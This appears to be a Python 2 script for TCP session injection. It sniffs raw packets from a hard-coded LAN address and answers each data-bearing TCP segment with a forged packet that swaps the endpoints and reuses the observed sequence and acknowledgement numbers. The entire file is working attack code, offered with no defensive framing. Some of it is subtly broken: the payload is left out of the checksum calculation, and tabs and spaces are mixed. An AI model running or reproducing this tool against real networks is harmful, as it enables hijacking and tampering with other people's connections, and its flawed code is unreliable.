#!/bin/env python
# -*- coding:utf-8 -*-
import socket
import os,ctypes,struct,binascii
from Header import ip,checksum


class tcp(object):
    def __init__(self, srcp, dstp, seq=1, ack=1):
        self.srcp = srcp
        self.dstp = dstp
        self.seqn = seq
        self.ackn = ack
        self.offset = 5 # Data offset: 5x4 = 20 bytes
        self.reserved = 0
        self.urg = 0
        self.ack = 1
        self.psh = 1
        self.rst = 0
        self.syn = 0
        self.fin = 0
        self.window = socket.htons(5840)
        self.checksum = 0
        self.urgp = 0
        self.payload = ""
    def pack(self, source, destination):
        data_offset = (self.offset << 4) + 0
        flags = self.fin + (self.syn << 1) + (self.rst << 2) + (self.psh << 3) + (self.ack << 4) + (self.urg << 5)
        tcp_header = struct.pack("!HHLLBBHHH",
                     self.srcp,
                     self.dstp,
                     self.seqn,
                     self.ackn,
                     data_offset,
                     flags,
                     self.window,
                     self.checksum,
                     self.urgp)
        #pseudo header fields
        source_ip = source
        destination_ip = destination
        reserved = 0
        protocol = socket.IPPROTO_TCP
        total_length = len(tcp_header) + len(self.payload)
        # Pseudo header
        psh = struct.pack("!4s4sBBH",
              source_ip,
              destination_ip,
              reserved,
              protocol,
              total_length)
        psh = psh + tcp_header + self.payload
        tcp_checksum = checksum(psh)
        tcp_header = struct.pack("!HHLLBBH",
                  self.srcp,
                  self.dstp,
                  self.seqn,
                  self.ackn,
                  data_offset,
                  flags,
                  self.window)
        tcp_header+= struct.pack("!H", tcp_checksum) + struct.pack("!H", self.urgp)
        return tcp_header

def inject(src_ip,dst_ip,srcp,dstp,seq,ack,data_len):
    src_ip,dst_ip=dst_ip,src_ip
    srcp,dstp=dstp,srcp
    print 'injecting'
    s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
    s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
    ipobj=ip(src_ip, dst_ip)
    iph = ipobj.pack()
    seq,ack=ack,seq+data_len-54
    tcpobj=tcp(srcp,dstp,seq,ack)
    data="this is a test data"
    tcpobj.data_length =len(data)
    tcph = tcpobj.pack(ipobj.source,
                   ipobj.destination)
    packet = iph + tcph + data
    s.sendto(packet,0,(dst_ip,dstp))
    print 'injected'
    ip_hdr=struct.unpack("!c11s4s4s",packet[:20])
    src_ip=socket.inet_ntoa(ip_hdr[2])
    dst_ip=socket.inet_ntoa(ip_hdr[3])
    print 'src_ip:',src_ip
    print 'dst_ip:',dst_ip


def sniffing(host,socket_prot,win=False):
    while True:
        sniffer=socket.socket(socket.PF_PACKET,socket.SOCK_RAW,socket.htons(0x0800))
        if win:
            sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
        pkt=sniffer.recvfrom(65565)
	ethernetHeader=pkt[0][0:14]
        eth_hdr = struct.unpack("!6s6sH",ethernetHeader)
	ipHeader=pkt[0][14:]
        ip_hdr = struct.unpack("!c11s4s4s",ipHeader[:20])
        src_ip=socket.inet_ntoa(ip_hdr[2]) 
        dst_ip=socket.inet_ntoa(ip_hdr[3])
        if src_ip!='192.168.18.174':
            continue
        ip_hdr_len=(ord(ip_hdr[0])%16)*4
        iptype= ord(ip_hdr[1][8])
        ip_hdr_end=14+ip_hdr_len
        if ip_hdr_len==0:
            continue
        if iptype==17:#UDP
            continue
        elif iptype==6:#tcp
            print '[ ] sniffer tcp packet!prepare injecting...'
	    tcpHeader = pkt[0][ip_hdr_end:]
	    tcp_hdr = struct.unpack("!HHLLc",tcpHeader[:13])
            tcp_hdr_len=ord(tcp_hdr[-1])/16*4
            seq=tcp_hdr[2]
            ack=tcp_hdr[3]
            if len(pkt[0])>ip_hdr_end+tcp_hdr_len:
                tcpdata= pkt[0][ip_hdr_end+tcp_hdr_len:]
                data_len=len(tcpdata)
            else:
                print '[ ] length of data equal zero ! abandonned'
                continue
                data_len=0
            inject(src_ip,dst_ip,tcp_hdr[0],tcp_hdr[1],seq,ack,data_len)
        else:
            #print iptype,pkt[0][ip_hdr_end:]
            pass
            
                
def main(host):
    if os.name=='nt':
        sniffing(host,socket.IPPROTO_IP,True)
    else:
        sniffing(host,socket.IPPROTO_ICMP)

if __name__=='__main__':
    main('192.168.18.174')
